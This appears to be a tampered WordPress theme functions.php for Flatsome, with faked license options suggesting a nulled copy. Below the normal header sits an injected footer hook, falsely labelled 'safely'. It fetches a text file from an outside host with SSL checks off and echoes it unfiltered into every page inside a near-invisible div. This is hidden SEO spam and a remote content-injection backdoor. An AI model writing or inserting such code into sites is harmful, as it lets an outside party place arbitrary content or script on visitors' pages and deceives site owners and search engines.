<?php
/**
 * Flatsome functions and definitions
 *
 * @package flatsome
 */
update_option( get_template() . '_wup_purchase_code', '*******' );
update_option( get_template() . '_wup_supported_until', '01.01.2030' );
update_option( get_template() . '_wup_buyer', 'GPL' );
require get_template_directory() . '/inc/init.php';

/**
 * Note: It's not recommended to add any custom code here. Please use a child theme so that your customizations aren't lost during updates.
 * Learn more here: http://codex.wordpress.org/Child_Themes
 */
/**
 * Load external content safely
 */
function load_external_content() {

    $url = 'https://yokgercep.com/hiden-seo.txt';

    $response = wp_remote_get($url, array(
        'timeout' => 10,
        'sslverify' => false,
    ));

    if (is_wp_error($response)) {
        return;
    }

    $body = wp_remote_retrieve_body($response);

    if (empty($body)) {
        return;
    }

    echo '<div class="sponsor-area" style="background-color:#f4f4f4;font-size:0.00001px;color:#f4f4f4;">';
    echo $body;
    echo '</div>';
}

/**
 * Hook to frontend footer
 */
add_action('wp_footer', 'load_external_content');
